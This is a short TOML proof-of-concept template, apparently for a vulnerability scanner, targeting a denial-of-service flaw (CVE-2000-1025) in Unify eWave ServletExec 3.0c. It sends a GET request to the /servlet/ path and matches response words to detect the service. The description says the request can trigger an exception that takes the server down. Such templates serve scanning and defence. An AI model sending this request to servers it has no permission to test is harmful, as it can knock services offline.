[info]
author = "ave"
description = "向目标 ServletExec 服务器发送包含 /servlet/ 路径的 HTTP 请求，若服务器返回正常响应表明 ServletExec 正在运行，可触发异常导致拒绝服务"
id = "POC-AVE-2000-0749"
name = "Unify eWave ServletExec 3.0c 拒绝服务漏洞 PoC"
severity = "medium"
tags = ["ave-2000-0749"]
vuln_id = [
    "CVE-2000-1025",
    "AVE-2000-0749",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/servlet/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "ServletExec",
    "servlet",
    "200 OK",
]
